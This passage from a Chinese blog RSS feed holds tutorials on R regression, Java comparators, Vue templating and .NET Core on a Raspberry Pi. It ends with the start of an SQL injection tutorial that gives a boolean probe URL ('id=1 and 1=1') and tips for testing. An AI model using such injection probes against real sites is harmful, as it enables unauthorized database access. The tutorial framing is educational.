&lt;p&gt;　　结果:婚龄每增加1岁,婚外情发生的可能性将乘以1.106,相反年龄增加1岁,婚外情发生的可能性乘以0.9652&lt;/p&gt;
&lt;p&gt;　　5.评价婚姻评分对婚外情的影响&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 1.手动生成数据集&lt;/span&gt;
&lt;span&gt;2&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 2.使用predict函数来进行预测&lt;/span&gt;
&lt;span&gt;3&lt;/span&gt; testdata &amp;lt;- data.frame(rating=c(1,2,3,4,5),age=&lt;span&gt;mean(Affairs$age),
&lt;/span&gt;&lt;span&gt;4&lt;/span&gt;                        yearsmarried=&lt;span&gt;mean(Affairs$yearsmarried),
&lt;/span&gt;&lt;span&gt;5&lt;/span&gt;                        religiousness=&lt;span&gt;mean(Affairs$religiousness))
&lt;/span&gt;&lt;span&gt;6&lt;/span&gt; &lt;span&gt;testdata
&lt;/span&gt;&lt;span&gt;7&lt;/span&gt; testdata$prob &amp;lt;- predict(fit.reduced,newdata = testdata,type=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;response&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;8&lt;/span&gt; testdata
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1173792/201802/1173792-20180222234610642-673725577.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　结果:当婚姻评分从1(很不幸)变成5(很幸福)的时候,婚外情发生的概率从0.53降低到0.15&lt;/p&gt;
&lt;p&gt;　　6.评价年龄对婚外情的影响&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; testdata &amp;lt;- data.frame(rating=&lt;span&gt;mean(Affairs$rating),
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;                        age=seq(17,57,10&lt;span&gt;),
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;                        yearsmarried=&lt;span&gt;mean(Affairs$yearsmarried),
&lt;/span&gt;&lt;span&gt;4&lt;/span&gt;                        religiousness=&lt;span&gt;mean(Affairs$religiousness))
&lt;/span&gt;&lt;span&gt;5&lt;/span&gt; testdata$prob &amp;lt;- predict(fit.reduced,newdata = testdata,type=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;response&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;6&lt;/span&gt; testdata
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1173792/201802/1173792-20180222234756715-612411036.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　结果:当其他变量不变时,年龄从17到57岁,婚外情的概率从0.34降低到0.11&lt;/p&gt;
&lt;p&gt;　　7.判断是否过度离势&lt;/p&gt;
&lt;p&gt;　　　　过度离势会导致标准误检验和不精确的显著性检验,此时任然可以使用gml()拟合拟合Logistics回归,但是把二项分布改为类二项分布&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 如果结果接近1,表示没有过度离势&lt;/span&gt;
&lt;span&gt;2&lt;/span&gt; deviance(fit.reduced)/df.residual(fit.reduced)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/1173792/201802/1173792-20180222235259291-1561662950.png&quot; alt=&quot;&quot; width=&quot;211&quot; height=&quot;51&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　结果:没有过度离势&lt;/p&gt;

&lt;p&gt;2.泊松回归(因变量为计数型)&lt;/p&gt;
&lt;p&gt;　　使用场景:通过一系列连续型或类别型预测变量来预测计数型结果变量时采用泊松分布&lt;/p&gt;
&lt;p&gt;　　案例:药物治疗是否能减小癫痫的发病数&lt;/p&gt;
&lt;p&gt;　　1.查看数据集&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; data(breslow.dat,package = &lt;span&gt;'&lt;/span&gt;&lt;span&gt;robust&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; &lt;span&gt;names(breslow.dat)
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt; summary(breslow.dat[c(6,7,8,10)])
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1173792/201802/1173792-20180222235754198-355073861.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　结果:我们分析年龄,治疗条件,前八周的发病次数和随机化后八周内的发病次数的关系,所以只采用4个变量&lt;/p&gt;
&lt;p&gt;　　2.图形&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; opar &amp;lt;- par(no.readonly =&lt;span&gt; T)
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; par(mfrow=c(1,2&lt;span&gt;))
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt; &lt;span&gt;attach(breslow.dat)
&lt;/span&gt;&lt;span&gt;4&lt;/span&gt; hist(sumY,breaks = 20,xlab = &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Seizure Count&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,main = &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Distribution of Sizeture&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;5&lt;/span&gt; boxplot(sumY~Trt,xlab=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Treatment&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,main=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Group Comparisons&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;6&lt;/span&gt; par(opar)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1173792/201802/1173792-20180223000038707-1070813256.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　结果:可以看出使用药物的组,癫痫的发病率有所减少&lt;/p&gt;
&lt;p&gt;　　3.拟合泊松回归&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; fit &amp;lt;- glm(sumY~Base+Age+Trt,data = breslow.dat,family =&lt;span&gt; poisson())
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; summary(fit)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1173792/201802/1173792-20180223000234170-1343283788.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　结果:偏差,回归参数,标准误差和参数为0的检验&lt;/p&gt;
&lt;p&gt;　　4.解释模型参数&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;coef(fit)
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; exp(coef(fit))
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1173792/201802/1173792-20180223000556596-653566964.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　结果:年龄每增加1岁,癫痫的发病数将乘以1.023,如果从安慰剂组调到药物组,则发病率会减少14%&lt;/p&gt;
&lt;p&gt;　　5.判断是否过度离势&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; deviance(fit)/df.residual(fit)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1173792/201802/1173792-20180223000819039-224491712.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　结果:大于1,存在过度离势&lt;/p&gt;
&lt;p&gt;　　6.调整模型&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; fit.new &amp;lt;- glm(sumY~Base+Age+Trt,data = breslow.dat,family =&lt;span&gt; quasipoisson())
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; summary(fit.new)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1173792/201802/1173792-20180223000919018-2093016979.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　结果:标准误差和第一次模型相比,大了许多,同时标准误差越大会导致Trt的p值大于0.05,所以并没有充分的证据表明药物治疗相对于使用安慰剂能够降低癫痫的发病次数&lt;/p&gt;
</description>
<pubDate>Thu, 22 Feb 2018 16:11:00 +0000</pubDate>
<dc:creator>月上贺兰</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/luhuajun/p/8460601.html</dc:identifier>
</item>
<item>
<title>似懂非懂的Comparable与Comparator - OKevin</title>
<link>http://www.cnblogs.com/yulinfeng/p/8460569.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yulinfeng/p/8460569.html</guid>
<description>&lt;p&gt;&lt;em&gt;&lt;strong&gt;jdk1.8.0_41&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;一知半解写代码， 集合排序用个啥。 抄起键盘胡乱打， 似懂非懂最可怕。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;　　Comparable与Comparator都是用于集合的排序，对于大多数人来说Comparator可能略微比Comparable要熟悉一点，类似下面这几句代码的使用频率应该是最高的。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
Collections.sort(list, &lt;span&gt;new&lt;/span&gt; Comparator&amp;lt;String&amp;gt;&lt;span&gt;() {
    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; compare(String o1, String o2) {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; o1.compareTo(o2);
    }
});&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　这是一段对集合排序的代码。&lt;/p&gt;
&lt;p&gt;　　对于集合排序时比较器的使用往往止步于此，以至于更为深层次的使用似懂非懂，更为复杂的排序不知所措。&lt;/p&gt;
&lt;p&gt;　　Comparable用于集合内部定义的方法实现的排序，Comparator用于集合外部实现的排序。&lt;/p&gt;
&lt;p&gt;　　我们从Collections.sort的两个重载方法开始&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;public static &amp;lt;T extends Comparable&amp;lt;? super T&amp;gt;&amp;gt; void sort(List&amp;lt;T&amp;gt; list)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;public static &amp;lt;T&amp;gt; void sort(List&amp;lt;T&amp;gt; list, Comparator&amp;lt;? super T&amp;gt; c)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　这两个方法都是泛型方法，第一个方法只传递一个List参数进行排序，第二个方法传递一个List参数加上一个Comparator比较器。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;public static &amp;lt;T extends Comparable&amp;lt;? super T&amp;gt;&amp;gt; void sort(List&amp;lt;T&amp;gt; list)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　Collections.sort方法用于对List集合进行排序，思考一个问题，这个只有一个参数的List如何进行排序呢？它是按照怎样的规则进行排序呢？答案就在这个泛型方法的泛型类型之中“&amp;lt;T extends Comparable&amp;lt;? super T&amp;gt;&amp;gt;”，List集合中的元素需要实现Comparable接口，Comparable接口也是一个泛型，并要求它的泛型类型需要是集合中的元素的超类（或自身）。重点在于——集合中的元素需要是实现Comparable接口。也就是说在使用Collections.sort(List)这个方法对集合中的元素进行排序时，需要集合中的元素实现了Comparable接口，这才能进行排序。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;public static &amp;lt;T&amp;gt; void sort(List&amp;lt;T&amp;gt; list, Comparator&amp;lt;? super T&amp;gt; c)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　这个方法同样是一个泛型方法，与上面的方法不同的是对集合中的元素类型并没有做限制，要对这个集合进行排序需要指定一个Comparator比较器，这个比较器的泛型类型需要是集合元素的超类（或自身）。&lt;/p&gt;
&lt;p&gt;　　通过上面这两个方法比较容易的能得出一个浅显的结论，Comparable和Comparator都是用于比较、排序，如果元素自身已经实现了Comparable接口，则可以利用它自身进行比较排序，如果元素自身没有实现Comparable接口，则可以利用外部实现Comparator比较器对元素进行比较排序。这也就是前面提到的Comparable用于集合内部定义的方法实现的排序，Comparator用于集合外部实现的排序。 接着来看Comparable接口和Comparator接口。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;　　&lt;/strong&gt;接着来看Comparable接口和Comparator接口。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Comparable&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;public int compareTo(T o)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　这个接口只定义了一个compareTo方法，在很多“值类型”的数据类型，例如String、Integer、Long等已经实现了这个接口。&lt;/p&gt;
&lt;p&gt;　　对于这个方法和equals方法有类似的地方，equals强调的更多是相等于否，而compareTo强调更多的比较，如果x &amp;lt; y，则返回-1；x = y，则返回0；x &amp;gt; y，则返回1。实现这个方法时同样需要遵循几个规则：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;自反性，如果x &amp;lt;y ，那么x.compareTo(y)返回-1，同理y.compareTo则返回1；&lt;/li&gt;
&lt;li&gt;传递性，如果x.compareTo(y)返回-1，y.compareTo(z)返回-1，则x.compareTo(z)也应该返回-1；&lt;/li&gt;
&lt;li&gt;同一性，如果x.compareTo(y)返回0（x = y），那么若x.compareTo(z)返回-1时，y.compareTo(z)也应该返回-1。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;　　有兴趣的可以查看String类中对于compareTo方法的实现，它的排序规则是将字符串转换为字符数组逐个按照字典序排序。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Comparator&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;int compare(T o1, T o2)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;boolean equals(Object obj)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　这个接口在JDK8中对它进行了较大的改进，在JDK8之前只包含上面两个方法，而JDK8则达到了18个方法，其中都是接口的default方法，和static静态方法，所以并不需要在实现时额外实现。&lt;/p&gt;
&lt;p&gt;　　在JDK8中该类添加了&lt;strong&gt;@FunctionalInterface&lt;/strong&gt;函数式接口的注解，函数式接口表明在接口中只含有一个方法作为Lambda表达式的数据类型，在&lt;a href=&quot;http://www.cnblogs.com/yulinfeng/p/8452379.html&quot; target=&quot;_blank&quot;&gt;《JDK8的新特性——Lambda表达式》&lt;/a&gt;中有提到，Java中定义如果覆盖了Object中的方法则不算，所以在Comparator接口中只有一个compare方法。对于@FunctionalInteface注解可加不可加，加上只是为了让编译器做更好的检查，要求只能定义一个方法，不加编译器便不对此进行检查。&lt;/p&gt;
&lt;p&gt;　　compare方法和compareTo方法类似，它同样需要满足上面提到的：自反性、传递性、同一性。并且它强调，不必严格满足“(compare(x, y)==0) == (x.equals(y))”，当然最好说明白。&lt;/p&gt;
&lt;p&gt;　　对于这个类，更多的是需要理解学习它所运用的设计模式——&lt;strong&gt;策略模式&lt;/strong&gt;。策略模式，不改变对象自身，而是用另一个对象来改变它的行为。例如，超市减价操作，有10件商品需要统一降价1半进行处理，我们可以在这10件商品的价格上全部做修改减少至它的一半，10件好处理，如果N件呢，甚至我们还需要对其进行降价呢？此时我们则可以使用一种“策略”——商品全部打5折。这就是利用另外一个对象来改变一个对象的行为，而不是简单粗暴地修改原有对象。说回此处，如果List中的元素本身没有实现Comparable接口，但我们需要对它进行排序，我们可以对原有对象进行修改让它实现Comparable接口，但凡涉及修改代码都不优美，此时我们则可以利用策略模式，也就是实现一个Comparator接口对集合中的元素进行排序。&lt;/p&gt;


&lt;p&gt;&lt;strong&gt;这是一个能给程序员加buff的公众号 &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/630246/201710/630246-20171018224424427-1683168589.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 22 Feb 2018 15:58:00 +0000</pubDate>
<dc:creator>OKevin</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yulinfeng/p/8460569.html</dc:identifier>
</item>
<item>
<title>vue 使用Jade模板写html，stylus写css - taoquns</title>
<link>http://www.cnblogs.com/taoquns/p/8460480.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/taoquns/p/8460480.html</guid>
<description>&lt;h4 id=&quot;vue-使用jade模板写htmlstylus写css&quot;&gt;vue 使用Jade模板写html，stylus写css&lt;/h4&gt;
&lt;p&gt;日常工作都是使用vue开发页面和webApp,写的多了就想偷懒简化各种书写方式，所以使用了jade写html，stylus写css，省了很多的步骤和提高了效率。&lt;/p&gt;
&lt;h6 id=&quot;安装包&quot;&gt;安装包&lt;/h6&gt;
&lt;pre&gt;
&lt;code&gt;// 安装jade包
npm install jade jade-loader --save-dev
// 如果使用vue-cli构建项目，则不需要安装stylus相关的包，vue-cli默认已安装
npm install stylus stylus-loader --save-dev&lt;/code&gt;
&lt;/pre&gt;
&lt;h6 id=&quot;配置文件&quot;&gt;配置文件&lt;/h6&gt;
&lt;pre&gt;
&lt;code&gt;// webpack.base.conf.js 配置
// jade
{
    test : /\.jade$/,
    loader : 'jade-loader',
}
// stylus 如果使用vue-cli构建，无需配置此项
{
    test : /\.styl$/,
    loader : 'stylus-loader',
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;jade使用前后对比&quot;&gt;jade使用前后对比&lt;/h5&gt;
&lt;pre&gt;
&lt;code&gt;// html 模板
&amp;lt;template&amp;gt;
    &amp;lt;div class='demo-components'&amp;gt;
        &amp;lt;h2&amp;gt;测试标题&amp;lt;/h2&amp;gt;
        &amp;lt;p&amp;gt;
            &amp;lt;span class='text'&amp;gt;这是一条测试的demo文本&amp;lt;/span&amp;gt;
            &amp;lt;i class='icon'&amp;gt;&amp;lt;/i&amp;gt;
        &amp;lt;/p&amp;gt;
        &amp;lt;input v-model='value1' @keydown.enter='loginIn'&amp;gt;
        &amp;lt;p&amp;gt;{{ oneText + &quot;-&quot; + &quot;twoText&quot; }}&amp;lt;/p&amp;gt;
    &amp;lt;/div&amp;gt;
&amp;lt;/template&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;// jade 模板
&amp;lt;template lang='jade'&amp;gt;
    div.demo-components
        h2 测试标题
        p
            span.text 这是一条测试的demo文本
            i.icon
        input(v-model='value1',@keydown.enter='loginIn')
        p {{ oneText + &quot;-&quot; + twoText }}
&amp;lt;/template&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h6 id=&quot;使用jade注意事项&quot;&gt;使用Jade注意事项&lt;/h6&gt;
&lt;ul&gt;&lt;li&gt;需要简单了解jade基本使用语法（10分钟简单了解即可）&lt;/li&gt;
&lt;li&gt;template 需要加上&lt;code&gt;lang='jade'&lt;/code&gt;属性&lt;/li&gt;
&lt;li&gt;标签内文本换行会解析错误，需要使用其他技巧性方法解决。例：&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;&amp;lt;template lang='jade'&amp;gt;
    div
        p 我是测试文本哇,可是文本太长需要换行啊，我恰巧回车试一
          下啊，啊呀，报错啦！！
&amp;lt;/template&amp;gt;
// 可以写进一个变量里、或方法中返回数据、或保持一行不换行&lt;/code&gt;
&lt;/pre&gt;
&lt;h6 id=&quot;stylus-前后对比&quot;&gt;stylus 前后对比&lt;/h6&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;style lang='css'&amp;gt; // css less sass scss 样式demo此处省略 

// stylus demo
&amp;lt;style lang='stylus'&amp;gt;
    .main-body
        width 300px
        heihgt 200px
        background-color rgba(0,0,0,1)
        .main-model
            width 50px
            height 50px
            margin 20px auto
&amp;lt;/style&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;stylus 可以使用极简的方式写css，也可以格式混合(为了保持格式统一，不建议)，将解析的任务交给webpack去做，我们只需要书写简单易读的代码即可。这是我喜欢的风格和方式，sass当然也可以做到，只是个人的机缘巧合现在使用了stylus。&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;写下本文做个人记录，也给其他人做个参考。&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Thu, 22 Feb 2018 15:09:00 +0000</pubDate>
<dc:creator>taoquns</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/taoquns/p/8460480.html</dc:identifier>
</item>
<item>
<title>树莓派3B上部署运行.net core 2程序 - 火冰·瓶</title>
<link>http://www.cnblogs.com/fireicesion/p/8460355.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/fireicesion/p/8460355.html</guid>
<description>&lt;p&gt;针对Linxu arm处理器如何部署.net core 2的资料很少，网上找到几篇但都写得不够详细，按照他们教程来撞墙了，折磨了几天终于部署成功了，先上一张运行成功的图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/146777/201802/146777-20180222222848769-1329448100.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;1.windows系统中，在项目的目录下使用CMD命令运行进行发布&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;    dotnet publish -r linux-arm&lt;/p&gt;
&lt;p&gt;   &lt;em&gt;说明：-r表示运行平台，可以是win-arm、linux-arm、win-x86、win-x64等等。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/146777/201802/146777-20180222224136611-307673503.png&quot; alt=&quot;&quot;/&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;2.在项目的目录中会生成bin\Debug\netcoreapp2.0\linux-arm 文件，把linux-arm文件夹下的publish文件夹的内容全部复制到树莓派上&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/146777/201802/146777-20180222225220224-2016508835.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt; 3.登录树莓派，进入刚才复制的文件夹目录，对刚才复制的项目授权755或777&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  #&amp;gt;chmod 777 ./StudyTwo&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;   &lt;img src=&quot;https://images2018.cnblogs.com/blog/146777/201802/146777-20180222225523721-125473987.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后执行&lt;/p&gt;
&lt;p&gt;#&amp;gt;./StudyTwo&lt;/p&gt;
&lt;p&gt;, 这个时候环境没配好肯定会报错&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/146777/201802/146777-20180222225709460-603792405.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt;4.接下来在树莓派上配置.net core 2的运行环境    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;4.1更新系统&lt;/p&gt;
&lt;p&gt;#&amp;gt; sudo apt update &amp;amp;&amp;amp; sudo apt upgrade &lt;/p&gt;
&lt;p&gt;4.2安装依赖项&lt;/p&gt;
&lt;p&gt;#&amp;gt;sudo apt install curl libunwind8 gettext&lt;/p&gt;
&lt;p&gt;4.3下载最新版本的armhf版本dotNet runtime，最新版的地址：https://github.com/dotnet/core-setup&lt;/p&gt;
&lt;p&gt;#&amp;gt;wget https://dotnetcli.blob.core.windows.net/dotnet/Runtime/master/dotnet-runtime-latest-linux-arm.tar.gz&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/146777/201802/146777-20180222230418125-165301534.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;4.4建立dotnet文件夹在opt目录 解压runtime文件到此文件夹&lt;/p&gt;
&lt;p&gt;#&amp;gt;sudo mkdir -p /opt/dotnet &amp;amp;&amp;amp; sudo tar zxf dotnet-runtime-latest-linux-arm.tar.gz -C /opt/dotnet&lt;/p&gt;
&lt;p&gt;4.5建立快捷方式到local bin&lt;/p&gt;
&lt;p&gt;#&amp;gt; sudo ln -s /opt/dotnet/dotnet /usr/local/bin&lt;/p&gt;

&lt;p&gt;&lt;span&gt;5.最后再回到.net项目目录运行 &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;#&amp;gt;./StudyTwo&lt;/p&gt;
&lt;p&gt;显示结果，成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/146777/201802/146777-20180222230948792-545493676.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

</description>
<pubDate>Thu, 22 Feb 2018 14:29:00 +0000</pubDate>
<dc:creator>火冰&amp;#183;瓶</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/fireicesion/p/8460355.html</dc:identifier>
</item>
<item>
<title>SQL注入详解 - 飞天小子</title>
<link>http://www.cnblogs.com/Zfc-Cjk/p/8460101.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Zfc-Cjk/p/8460101.html</guid>
<description>&lt;p&gt;&lt;span&gt;&lt;strong&gt;1：什么是SQL注入&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;SQL注入是一种将SQL代码插入或添加到应用(用户)的输入参数中的攻击，之后再将这些参数传递给后台的SQL服务器加以解析并执行。&lt;/p&gt;
&lt;p&gt; www.xx.com/news.php?id=1&lt;br/&gt; www.xx.com/news.php?id=1 and 1=1&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这里我们来理解一下SQL注入&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;首先，SQL注入常年蝉联OWASP排行榜第一名~&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/946454/201802/946454-20180222201624698-1944728587.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SQL注入产生的过程是怎样的呢？见下图&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/946454/201802/946454-20180222201801162-1008133886.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SQL注入的危害有哪些呢？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　数据库信息泄露&lt;br/&gt;　　网页篡改&lt;br/&gt;　　网站被挂马&lt;br/&gt;　　数据库被恶意操作&lt;br/&gt;　　服务器被远程控制&lt;br/&gt;　　破坏硬盘数据。。。。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2 我们来学习一下sql注入的方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/946454/201802/946454-20180222202118098-498160370.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.1取消友好HTTP错误消息&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;一般通过远程测试判断是否存在SQL注入，所以通常没有机会通过查看源代码来复查注入的查询结构。这导致经常需要通过推理来进行大量测试&lt;/p&gt;
&lt;p&gt; 　　打开IE浏览器，选择菜单“工具”-&amp;gt;“Internet选项”对话框。&lt;br/&gt; 　　打开“高级”选项卡，在设置列表中找到“浏览”组，&lt;br/&gt; 　　取消勾选”显示友好HTTP错误信息”复选框 。如下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/946454/201802/946454-20180222202307537-722757131.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.2寻找SQL注入&lt;/strong&gt;&lt;/p&gt;
